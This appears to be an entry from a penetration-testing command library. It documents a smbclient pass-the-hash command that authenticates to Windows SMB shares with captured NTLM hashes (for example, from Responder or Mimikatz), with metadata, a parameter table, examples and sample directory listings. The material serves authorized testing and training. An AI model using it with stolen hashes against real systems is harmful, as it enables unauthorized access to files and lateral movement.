---
id: 64c9cbc5-2533-426d-80de-04ae7e5be6a1
name: smbclient-connect-to-smb-share-with-ntlm
type: command
executor: bash
data: smbclient -U $_USERNAME%$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
output: |-
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                  DR        0  Tue Sep 17 13:19:57 2019
    ..                                 DR        0  Tue Sep 17 13:19:57 2019
    Default                           DHR        0  Tue Jul 14 03:17:20 2009
    desktop.ini                       AHS      174  Tue Jul 14 00:41:57 2009
    Public                             DR        0  Mon Apr 11 22:24:18 2011
    bob                                 D        0  Tue Sep 17 13:20:06 2019

                  15728127 blocks of size 4096. 13836018 blocks available
created_at: '2019-09-18T01:44:02.127015+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - smb
  - authentication
verified: true
validated: true
---

# smbclient-connect-to-smb-share-with-ntlm

## Command

```bash
smbclient -U $_USERNAME%$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
```

## Description

This command connects to a remote SMB share using smbclient with NTLM hash authentication, opening an interactive session for file operations. Use it when you have captured NTLM hashes (e.g., via Responder or Mimikatz) and need to access Windows file shares without plaintext passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Username for SMB authentication | Yes |
| $_NTLM_HASH | NTLM hash of the user's password | Yes |
| $_TARGET_IP | IP address of the target Windows host | Yes |
| $_SHARE_NAME | Name of the SMB share (e.g., Users, C$) | Yes |
| -U | Specifies username and credentials format | Built-in |
| --pw-nt-hash | Enables NTLM hash authentication instead of password | Built-in |

## Examples

### Basic Usage

```bash
smbclient -U bob%aad3b435b51404eeaad3b435b51404ee --pw-nt-hash //10.10.10.10/Users
```

### Advanced Usage

```bash
smbclient -U bob%aad3b435b51404eeaad3b435b51404ee --pw-nt-hash -N //10.10.10.10/IPC$ -c 'ls'
```
(Uses -N for no password prompt if hash is embedded, targets IPC$ for remote procedure calls.)

## Expected Output

```
Try "help" to get a list of possible commands.
smb: \Users\> ls
  .                                   D        0  Fri Oct 11 10:00:00 2019
  ..                                  D        0  Fri Oct 11 10:00:00 2019
  Default                            DH R     0  Sat Jun  1 09:00:00 2013
  Public                             DHR      0  Mon Apr 11 22:24:18 2011
  bob                                 D        0  Tue Sep 17 13:20:06 2019

                15728127 blocks of size 4096. 13836018 blocks available
```

The output shows the interactive prompt (smb: \share\>) and a directory listing if 'ls' is run, confirming access. Errors like 'NT_STATUS_LOGON_FAILURE' indicate invalid credentials.

## Related

- [[commands/smbclient-download-files-recursively]]
- [[procedures/Recursively-Download-Files-From-SMB-Share]]
